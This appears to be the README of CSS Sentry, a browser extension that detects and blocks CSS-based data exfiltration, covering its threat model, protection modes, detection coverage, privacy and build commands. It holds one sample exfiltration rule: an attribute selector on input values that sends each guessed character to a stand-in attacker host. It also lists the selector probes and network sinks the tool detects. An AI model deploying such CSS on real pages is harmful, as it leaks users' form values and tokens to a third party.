# CSS Sentry

**CSS Sentry** is a browser extension for detecting and reducing risk from CSS-based data exfiltration attacks.

CSS Sentry is not a fork of [CSS Exfil Protection](https://github.com/mlgualtieri/CSS-Exfil-Protection/). It is a clean implementation informed by prior research, public bypasses, browser-platform changes, historical extension issues, and real-world CSS injection / filtering failures.

---

[![Firefox Addon](docs/firefox-addon-logo.svg)](https://addons.mozilla.org/en-US/firefox/addon/css-sentry/)

> [!NOTE]
> This project were built entirely with AI.

> [!IMPORTANT]
> I didnt publish to Chrome Store, if needed, just clone the project and run `pnpm i; pnpm build; pnpm zip` and in the `.output` folder, drag-and-drop the `.zip` into chrome extension view, with `Developer Mode` enabled.

## What CSS Sentry Does

CSS Sentry looks for risky CSS patterns where a stylesheet combines:

1. selectors that can probe page state, attributes, DOM structure, form values, tokens, or sensitive UI state; and
2. CSS features that can trigger outbound network requests.

In simplified terms:

```text
selector/probe capability + network/output sink + sensitive context = possible CSS exfiltration risk
```

For example, hostile CSS may try to infer sensitive values by using selectors such as:

```css
input[value^="a"] {
  background-image: url("https://attacker.example/leak/a");
}
```

CSS Sentry attempts to detect patterns like this, explain them to the user, and reduce their impact.

## What CSS Sentry Does Not Promise

CSS Sentry is a defense-in-depth tool. It does **not** guarantee complete protection against every CSS-based leak.

It does not claim to prevent:

- every CSS exfiltration technique;
- every CSS injection attack;
- every browser side channel;
- every XS-Leak;
- every future CSS feature abuse;
- malicious JavaScript running in the page;
- compromised websites;
- malicious browser extensions;
- server-side compromise;
- phishing or direct credential theft;
- browser-native parser bugs;
- every leak in cross-origin frames or stylesheets that the browser prevents extensions from inspecting.

CSS Sentry reduces exposure to known high-risk CSS exfiltration and rendered-content remote-resource patterns. It should not replace secure application design, output encoding, sanitization, dependency review, or Content Security Policy.

## Why This Exists

CSS can do more than style a page. In some cases, CSS selectors can infer page state, and CSS properties can cause the browser to make network requests. When those two capabilities are combined, CSS can become an exfiltration channel.

This matters especially when:

- a website allows user-controlled HTML or CSS;
- a custom theme feature allows unsafe CSS;
- untrusted third-party CSS is loaded;
- rendered email or document content includes style rules;
- markdown or rich-text content is rendered into trusted pages;
- comments, tickets, or helpdesk messages are rendered as HTML;
- JavaScript is blocked, but CSS is still allowed;
- sensitive values are reflected into DOM attributes.

Older CSS-exfil extensions demonstrated that browser-side mitigation is possible, but the browser-extension platform has changed significantly. Chrome now requires a Manifest V3-first approach, and a new implementation needs to be explicit about what extensions can and cannot do.

## Extension self-security hardening

CSS Sentry also includes self-security safeguards: runtime messages are schema/sender validated, settings imports are capped and normalized, local reports are size-limited, DNR status is visible in Options, and extension UI tests forbid HTML-injection/dynamic-code sinks.

## Project Documentation

Project tracking and engineering documents live under `docs/`:

- [`docs/SPEC.md`](./docs/SPEC.md) — product, architecture, policy, UI, and testing requirements.
- [`docs/CVE_SPEC.md`](./docs/CVE_SPEC.md) — CVE-derived requirements, fixtures, and release checklist items.
- [`docs/STATUS.md`](./docs/STATUS.md) — current implementation/testing status, known gaps, release gates, and future/non-goal feature notes.
- [`docs/SECURITY.md`](./docs/SECURITY.md) — supported versions, security report scope, and safe reproduction guidance.
- [`docs/PRIVACY.md`](./docs/PRIVACY.md) — local-first privacy model, report storage, redaction, and telemetry stance.
- [`docs/PERMISSIONS.md`](./docs/PERMISSIONS.md) — browser permission rationale and store-listing guidance.
- [`docs/SELF_SECURITY.md`](./docs/SELF_SECURITY.md) — traceability for runtime-message validation, settings import hardening, DNR status visibility, permission minimization, UI injection invariants, inline-style fixtures, and storage caps.
- [`docs/RELEASE_CHECKLIST.md`](./docs/RELEASE_CHECKLIST.md) — manual verification, artifact, release-candidate, and stable-release checklist.
- [`docs/RELEASE_NOTES.md`](./docs/RELEASE_NOTES.md) — changelog and release history for development snapshots, release candidates, stable releases, and corrective packages.

`README.md` is intentionally the only root markdown document.

## Browser Support

### Chrome / Chromium

CSS Sentry targets **Manifest V3**.

The Chrome version uses content scripts, DOM and stylesheet scanning, local finding storage, selected `declarativeNetRequest` blocking, per-site configuration, strict mode, and explicit partial-analysis reporting.

Chrome Manifest V3 does not allow an extension to freely inspect and rewrite every stylesheet response before the page uses it. CSS Sentry is designed around that limitation.

### Firefox

Firefox support uses the same baseline detection engine.

A future enhanced Firefox mode may support deeper stylesheet response handling where browser APIs and permissions allow it. Any Firefox-only enhanced behavior will be documented separately and will not be required for the common cross-browser baseline.

### Unsupported Platforms

Unless future maintainers explicitly add support, CSS Sentry does not target:

- Chrome Manifest V2;
- XUL extensions;
- Pale Moon;
- Waterfox Classic;
- legacy Firefox versions that lack the required WebExtension APIs.

## Protection Modes

### Passive Mode

Detection-only mode. CSS Sentry scans CSS, records local findings, shows warnings, and avoids page-breaking actions.

### Balanced Mode

Recommended general-use mode after the extension is stable. CSS Sentry detects suspicious CSS, warns on medium-confidence patterns, blocks high-confidence remote exfiltration sinks where possible, and lets users review or change protection per site.

### Strict Mode

Opt-in mode for sensitive sites.

Useful for:

- webmail;
- banking;
- identity providers;
- password managers;
- crypto exchanges;
- cloud consoles;
- admin panels;
- CMS dashboards;
- comment moderation pages;
- helpdesk and ticketing systems;
- internal dashboards;
- healthcare or legal portals;
- markdown preview or rendered-document applications.

Strict mode may block suspicious CSS fail-closed, block third-party stylesheets unless allowed, block third-party CSS-triggered image/font/resource requests, and warn when a stylesheet or frame cannot be inspected.

Strict mode may break some sites. It is intended for sensitive contexts where stronger protection is worth possible compatibility tradeoffs.

## Detection Coverage

CSS Sentry aims to detect risky combinations involving selector probes, CSS network sinks, sensitive contexts, and evasion patterns.

### Selector Probes

Examples include:

- `[value^="..."]`, `[value$="..."]`, and `[value*="..."]` selectors;
- selectors targeting sensitive form fields or hidden inputs;
- selectors involving token, session, auth, CSRF, nonce, email, password, secret, key, state, or code-like attributes;
- relational selectors such as `:has()`;
- repeated selector patterns that resemble brute-force extraction;
- suspicious probing of `data-*`, `aria-*`, `href`, `src`, `name`, or similar attributes.

### Network / Output Sinks

Examples include:

- `background` and `background-image`;
- `border-image`;
- `list-style` and `list-style-image`;
- `cursor`;
- URL-capable `content`;
- `mask`, `mask-image`, `clip-path`, and `filter` where URL-capable;
- URL-capable SVG references;
- `@font-face` remote sources;
- SVG `<style>` blocks in rendered content, including `@import` and remote SVG paint URL sinks;
- `@import`;
- other declarations containing remote `url()` references.

### Evasion and Parser Edge Cases

CSS Sentry should account for:

- nested grouping rules such as `@media`, `@supports`, `@layer`, and `@container`;
- CSS custom properties and `var()` fallback chains;
- comments, whitespace, escapes, and mixed-case CSS tokens;
- misleading remote URL fragments or paths such as strings containing `;base64,`;
- dynamically inserted styles;
- inline `style=""` attributes where feasible;
- same-origin vs cross-origin stylesheet differences;
- same-origin iframe scanning where permissions allow;
- explicit reporting for frames or stylesheets that cannot be inspected.

## Analysis Transparency

CSS Sentry should avoid pretending coverage is complete when analysis is partial.

Findings and reports should distinguish states such as:

```text
analysis.complete
analysis.partial
stylesheet.pending
stylesheet.cross_origin_uninspectable
stylesheet.failed_permission
stylesheet.failed_csp_or_platform
analysis.skipped.too_large
analysis.skipped.performance_budget
```

When CSS Sentry cannot fully analyze something, it should say so clearly.

## Privacy

CSS Sentry is local-first.

By default:

- no telemetry;
- no remote analysis service;
- no account;
- no upload of CSS, URLs, selectors, findings, or page contents;
- no remote fetching of stylesheets by the extension solely for analysis;
- findings are stored locally;
- logs can be cleared by the user.

Remote stylesheet fetching from the extension context should not be enabled by default. If it is ever added, it must be opt-in, clearly explained, and compatible with common blockers.

If telemetry is ever added, it must be opt-in, minimal, documented, and disabled by default. See [`docs/PRIVACY.md`](./docs/PRIVACY.md) for the detailed privacy model.

## Permissions

CSS Sentry should request only the permissions needed for detection and mitigation.

Possible permissions include:

- storage for local settings and findings;
- content-script access to inspect pages where enabled;
- optional host permissions for specific sites;
- declarative network request rules for Chrome blocking behavior.

The extension should explain permission requests in plain language and degrade gracefully when permissions are not granted.

Missing permissions should produce clear UI states, not noisy console errors. See [`docs/PERMISSIONS.md`](./docs/PERMISSIONS.md) for the permission rationale.

## User Interface

CSS Sentry should provide a standard interface for common tasks and an optional **advanced mode** for lower-level controls. Advanced mode reveals scan-only / never-scan modes, destination allow/block lists, exact per-origin mode overrides, and experimental compatibility switches. Turning advanced mode on changes what settings are visible; it does not weaken protection by itself.

CSS Sentry should provide:

- current-site status;
- finding count and highest severity;
- global protection mode shared with Options;
- site-specific rules in Options, with advanced trust/pause controls when advanced mode is enabled;
- blocked destination list;
- local finding report;
- options page for global and per-site rules;
- clear indication of complete vs partial analysis;
- exportable diagnostic information that avoids sensitive data.

Each finding should explain what was detected, why it was considered risky, which CSS sink was involved, which destination domain was involved, what action was taken, and whether the relevant stylesheet or frame was inspectable.

Sensitive values should be redacted from findings unless they are already part of the CSS source and necessary for debugging.

## Development and Verification

CSS Sentry uses **pnpm**. Use pnpm for install, test, build, and e2e commands.

Install dependencies when dependencies change or after extracting a fresh package:

```bash
pnpm install --frozen-lockfile
```

Common verification commands:

```bash
pnpm run compile
pnpm run test
pnpm run test:ai      # optional: writes json-report.json for AI/debug review
pnpm run build
pnpm run build:firefox
```

Full verification command:

```bash
pnpm run verify:full  # Chrome/Firefox builds + compile + tests + e2e
```

Development watch commands are only for active local development:

```bash
pnpm run dev
pnpm run dev:firefox
```

Do not use `pnpm dev` as the normal way to validate a packaged build. For clean validation, use `pnpm run build` and load `.output/chrome-mv3` as an unpacked extension.

### E2E setup

Playwright browser binaries are not committed to the repository. On supported hosts, install Playwright Chromium explicitly when needed:

```bash
pnpm run setup:e2e:browser
# equivalent to: pnpm exec playwright install chromium
```

Run the e2e suite after a build:

```bash
pnpm run build
pnpm run test:e2e
```

`test:e2e` runs Playwright directly and does not build automatically.

For supported Debian/Ubuntu hosts or CI images where downloading the Playwright browser is desired:

```bash
pnpm run test:e2e:with-install
```

### Linux browser dependencies

Playwright's `install-deps` command is Debian/Ubuntu oriented. Do not use it as a cross-distro setup command.

On Arch Linux / Manjaro, prefer the distro Chromium package and point Playwright at it:

```bash
sudo pacman -S --needed chromium
PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH=$(command -v chromium) pnpm run test:e2e
```

For a reminder from the project itself:

```bash
pnpm run setup:e2e:arch
```

If Playwright reports a missing shared library on Arch, install the Arch package that provides that library rather than using the Debian-oriented `install-deps` helper.

## Testing and Compatibility

CSS Sentry should include tests for both attack and benign cases, including classic CSS exfiltration patterns, CSS variables, nested rules, `:has()`, inline styles, iframe handling, rendered email, rendered markdown, nonce/token probes, and parser edge cases.

CSS Sentry should also be tested alongside common privacy and security extensions, including:

- uBlock Origin;
- uBlock Origin Lite;
- NoScript;
- JShelter;
- browser tracking protection;
- enterprise extension policies where possible.

Compatibility testing should include large pages, dynamic carousels, embedded maps, iframes, extension-altered pages, and pages with missing host permissions.

Detailed implementation requirements and test fixtures are maintained in `docs/SPEC.md` and `docs/CVE_SPEC.md`. Fixture coverage is expectation-driven: every active fixture under `tests/fixtures` must have a matching `.expected.json` file describing expected findings, reason codes, severity, destinations, and block-candidate behavior.

Current release/readiness tracking is maintained in `docs/STATUS.md`.

The e2e suite includes browser-runtime checks that load the built extension, serve fixtures over local HTTP, verify content-script findings reach the extension report page, verify same-origin iframe reports are merged, verify first-load destination blocklist behavior, and exercise benign no-breakage pages such as carousels, embedded-map-like UI, webmail themes, Tailwind-like output, CSS Modules-like output, and inert markdown code blocks.

## Historical Issue Coverage

CSS Sentry’s implementation should explicitly address known issue classes from earlier CSS-exfil browser-extension work, including:

- Manifest V3 compatibility;
- brittle substring checks such as treating `[data-value]` like `[value]`;
- unsafe URL classification such as misreading remote URLs containing `;base64,`;
- CSS variable and fallback-chain bypasses;
- nested grouping-rule bypasses;
- first-load and cross-origin stylesheet races;
- missing host-permission errors;
- extension-context network requests that bypass or conflict with blockers;
- high CPU usage on very large pages;
- page breakage from broad mitigation CSS;
- compatibility with NoScript, JShelter, uBlock Origin, and uBO Lite;
- fixed page-visible markers that make extension detection trivial;
- unsupported legacy platforms.

These requirements are defined in detail in `docs/SPEC.md`.

## CVE-Derived Requirements

CVE-derived requirements are maintained separately in `docs/CVE_SPEC.md`.

Release planning must treat `docs/CVE_SPEC.md` as normative for CVE-derived regression tests, fixtures, and release checklist items.

The README intentionally does not duplicate the CVE tables. At a high level, `docs/CVE_SPEC.md` tracks requirements for:

- CSS Exfil Protection-specific vulnerability classes;
- CSS variable bypasses;
- nested CSS rule bypasses;
- parser and tokenization edge cases;
- rendered email and helpdesk contexts;
- rendered markdown and rich-text contexts;
- nonce/token/CSRF exfiltration patterns;
- iframe partial-coverage reporting;
- release-time CVE and advisory triage.

## Project Status

Current implementation coverage, verification status, known gaps, and release gates are tracked in [`docs/STATUS.md`](./docs/STATUS.md).

Use `docs/STATUS.md` as the source of truth for whether a requirement is implemented, partially implemented, not yet tested, or release-ready.

## Security Principles

CSS Sentry should follow these principles:

- no remote code execution;
- no dynamic `eval`;
- no telemetry by default;
- no regex-only CSS security decisions;
- no unnecessary page-visible markers;
- no fixed injected class or element names that make detection trivial;
- no noisy console logs in production;
- minimal permissions;
- local-first logs;
- transparent limitations;
- parser-backed detection;
- bounded performance impact;
- public regression tests for bypasses and false positives.

## Reporting Security Issues

Please report bypasses, false negatives, false positives, permission problems, and compatibility problems through the project’s issue tracker or security disclosure channel.

Useful reports include:

- browser and version;
- extension version;
- protection mode;
- minimal HTML/CSS reproduction;
- expected behavior;
- actual behavior;
- whether other blockers were enabled;
- whether the affected page used iframes, rendered email, rendered markdown, or third-party stylesheets.

Avoid including real credentials, tokens, private page data, or live sensitive URLs in reports. See [`docs/SECURITY.md`](./docs/SECURITY.md) for the security-reporting policy.

## Name

The working name is **CSS Sentry**.

The name is intentionally non-absolute. The extension watches for and mitigates risky CSS behavior; it does not claim perfect protection against every possible CSS leak.

## License

License to be decided.

Recommended options:

- MIT for broad reuse;
- MPL-2.0 if preserving openness of modifications is desired;
- GPL-3.0 if strong copyleft is desired.

## Disclaimer

CSS Sentry is an additional browser-side safety layer. It is not a substitute for secure web application design.

Websites that handle sensitive data should still use proper sanitization, output encoding, least-privilege rendering, dependency review, and a strong Content Security Policy.

### Verification workflow

Use `pnpm dev` only for live development/watch mode. For clean validation of a package, release candidate, or stable release, use:

```bash
pnpm install --frozen-lockfile
pnpm run verify:full
```

`verify:full` is the full manual release gate: Chrome/Firefox builds, compile, unit/integration tests, and browser e2e.

### Report redaction

CSS Sentry stores reports locally, but reports are still minimized before storage and export. Sensitive selector values, URL credentials, query values, fragments, and token-like path segments are redacted while preserving destination origins and reason codes for debugging.

#

### Current tracking posture

The project keeps implementation status, future-watch items, avoided features, and limitations in `docs/STATUS.md`. CVE-derived coverage and adjacent/out-of-scope advisory triage live in `docs/CVE_SPEC.md`.

Recent search-driven coverage includes mixed-case `data:text/css` stylesheet links and escaped CSS `@import` sanitizer-bypass classes. Adjacent JavaScript-only SVG/XSS and browser-engine memory-corruption CVEs are documented as limitations or non-goals rather than implemented as CSS Sentry features.

## Documentation preservation

The detailed project documents under `docs/` are part of CSS Sentry's safety and release process. They track implemented behavior, limits, CVE-derived requirements, self-security controls, and release gates. They should be updated additively rather than reduced to summaries. Release notes are the changelog home; status is the coverage and verification-state document; SPEC is the requirements document; CVE_SPEC is the CVE traceability document.

### Current tracking posture

The project keeps implementation status, future-watch items, avoided features, and limitations in `docs/STATUS.md`. CVE-derived coverage and adjacent/out-of-scope advisory triage live in `docs/CVE_SPEC.md`.

Recent search-driven coverage includes mixed-case `data:text/css` stylesheet links and escaped CSS `@import` sanitizer-bypass classes. Adjacent JavaScript-only SVG/XSS and browser-engine memory-corruption CVEs are documented as limitations or non-goals rather than implemented as CSS Sentry features.

## Documentation and publication assets

Documentation and store-readiness assets live under `docs/` when they are part of project tracking rather than runtime extension code. Current badge/logo assets are:

- `docs/chrome-extension-logo.png`
- `docs/firefox-addon-logo.svg`

These assets do not mean public store submission is required for source-package releases. Store screenshots, store copy, and actual Chrome Web Store / Firefox Add-ons submissions remain publication tasks, not runtime implementation requirements.

## Adjacent vulnerability scope

CSS Sentry tracks adjacent sanitizer, SVG, rendered-content, and browser-rendering issues when they clarify the threat model. Some are intentionally out of scope: JavaScript-only XSS, uploaded-SVG execution, package-vulnerability detection, server-side sanitizer patching, and browser-engine memory-safety bugs are not implemented as CSS Sentry detection features unless they create CSS-triggered remote-resource behavior that matches the project threat model.

### Documentation scope note

Project tracking documents use scoped coverage language. `Covered for documented scope` means behavior is implemented and tested for CSS Sentry's stated threat model and current corpus; it does not claim universal protection against every future CSS feature, sanitizer bug, browser side channel, or extension compatibility combination.

### Advanced optional coverage

Advanced options include off-by-default controls for external SVG image-document partial-coverage reporting, Strict-mode SVG image-document destination policy, and Firefox stylesheet response inspection when Firefox exposes the required response-filter API. These are not part of the default Balanced behavior and can increase reporting noise or breakage risk on complex pages. CSS Sentry still does not claim full inspection of SVG files loaded only as image resources.
